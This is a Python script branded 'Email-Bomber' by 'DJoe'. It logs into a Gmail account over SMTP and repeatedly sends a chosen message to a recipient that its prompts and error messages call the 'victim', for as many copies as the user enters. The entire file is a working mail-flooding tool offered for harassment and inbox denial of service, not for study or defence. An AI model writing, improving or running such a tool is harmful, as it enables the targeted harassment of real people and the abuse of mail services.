#!/usr/bin/env python

import smtplib, getpass, subprocess

def send_mail(emailfrm, emailto , password, message, no_of_email):
    try:
        server = smtplib.SMTP("smtp.gmail.com", 587)
        server.starttls()
        server.login(emailfrm, password)

        for total in range(1, no_of_email+1):

            server.sendmail(emailfrm, emailto, message)
            print(u"\n\n\u001b[0m\033[1;32;40m \t[+] \u001b[34mNo of mail sent\u001b[20;1m %i" % total )

        server.quit()
        print(u"\u001b[0m\n")
    except KeyboardInterrupt:
        print(u"\n\u001b[31m[-] Quitting...\u001b[0m")
    except smtplib.SMTPAuthenticationError:
        print(u"\u001b[0m\n\u001b[31m[-] You may entered the wrong password or email address. Please try again\u001b[0m")
    except NameError:
        print(u"\u001b[0m\n\u001b[31m[-] You may entered wrong credential. Please Try again.\u001b[0m")
    except smtplib.SMTPRecipientsRefused:
        print(u"\u001b[0m\n\u001b[31m[-] You may entered victim's email wrongly!. Please Try again.\u001b[0m")
subprocess.call("clear")
print(u"""\033[5m\u001b[31m _____                 _ _       ____                  _               
| ____|_ __ ___   __ _(_) |     | __ )  ___  _ __ ___ | |__   ___ _ __ 
|  _| | '_ ` _ \ / _` | | |_____|  _ \ / _ \| '_ ` _ \| '_ \ / _ \ '__|
| |___| | | | | | (_| | | |_____| |_) | (_) | | | | | | |_) |  __/ |   
|_____|_| |_| |_|\__,_|_|_|     |____/ \___/|_| |_| |_|_.__/ \___|_|   \u001b[0m \u001b[33;1mBy:DJoe\u001b[0m""")
try:
    fromemail = raw_input(u"\n\033[1;33;40m[*] \u001b[20;2mEnter Your Email \u001b[21;4m>> ")
    your_password = getpass.getpass(u"\n\u001b[0m\033[1;33;40m[*] \u001b[20;2mEnter Your Password \u001b[21;4m>> ")
    toemail = raw_input(u"\n\u001b[0m\033[1;33;40m[*] \u001b[20;2mEnter the Victim's Email \u001b[21;4m>> ")
    messageto = raw_input(u"\n\n\u001b[0m\033[1;33;40m[*] \u001b[20;2mEnter the message to be send \u001b[21;4m>>\n\t ")
    no_of_message = input(u"\n\u001b[0m\033[1;33;40m[*] \u001b[20;2mEnter the no of Message to be send \u001b[21;4m>> ")
    send_mail(fromemail, toemail, your_password, messageto, no_of_message)
except NameError:
    print(u"\u001b[0m\n\u001b[31m[-] You may entered wrong credential. Please Try again.\u001b[0m")